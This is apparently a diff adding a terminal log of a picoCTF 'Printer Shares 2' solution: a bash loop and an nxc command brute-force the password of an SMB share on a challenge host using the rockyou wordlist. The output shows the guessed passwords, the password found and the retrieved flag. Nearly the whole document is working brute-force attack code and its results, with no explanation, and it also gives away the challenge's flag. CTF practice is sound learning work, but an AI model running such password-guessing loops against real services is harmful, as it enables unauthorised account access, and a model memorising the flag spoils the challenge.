@@ -1,0 +1,31 @@
+┌─[cristian@Prestige-13-AI]─[~/Documentos/picoCTF/32/Printer Shares 2]
+└──╼ $ while read -r pw; do 
+ echo "[*] probando $pw"
+ out=$(smbclient //green-hill.picoctf.net/secure-shares -p 61289 -U "joe%$pw" -c 'ls' 2>/dev/null)
+ if echo "$out" | grep -qiE 'flag|NT_STATUS_OK|blocks available'; then
+ echo "[+] PASSWORD = $pw"
+ smbclient //green-hill.picoctf.net/secure-shares -p 61289 -U "joe%$pw" -c 'get flag.txt'
+ cat flag.txt
+ break
+ fi
+done < /usr/share/wordlists/rockyou.txt
+
+┌─[cristian@Prestige-13-AI]─[~/Documentos/picoCTF/32/Printer Shares 2]
+└──╼ $ nxc smb green-hill.picoctf.net --port 61289 -u joe -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding
+
+[*] probando 88888888
+[*] probando 5201314
+[*] probando jerome
+[*] probando gandako
+[*] probando muffin
+[*] probando gatita
+[*] probando babyko
+[*] probando 246810
+[*] probando sweetheart
+[*] probando chivas
+[*] probando ladybug
+[*] probando kitty
+[*] probando popcorn
+[+] PASSWORD = popcorn
+getting file \flag.txt of size 44 as flag.txt (0,1 KiloBytes/sec) (average 0,1 KiloBytes/sec)
+picoCTF{5mb_pr1nter_5h4re5_5ecure_f854c38d}
